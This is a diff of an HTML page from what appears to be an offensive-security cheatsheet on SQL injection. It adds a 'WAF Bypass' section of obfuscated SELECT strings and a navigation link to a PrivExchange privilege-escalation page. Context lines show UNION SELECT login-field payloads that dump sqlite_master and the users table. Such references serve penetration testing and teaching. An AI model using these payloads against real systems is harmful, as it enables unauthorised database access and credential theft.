@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:25 CET">
+<meta name="revised" content="2019-11-10T13:28:45 CET">
 <title>SQL Injections :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1633,6 +1640,17 @@ login=admin&quot; UNION SELECT sql,2 FROM sqlite_master WHERE type!='meta' AND s
 
 # Query one specific rowinfi
 login=admin&quot; UNION SELECT login,2 FROM users LIMIT 1 OFFSET 2--&amp;password=zzz
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="waf-bypass">WAF Bypass</h3>
+
+<pre><code>SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
 </code></pre>
 
 
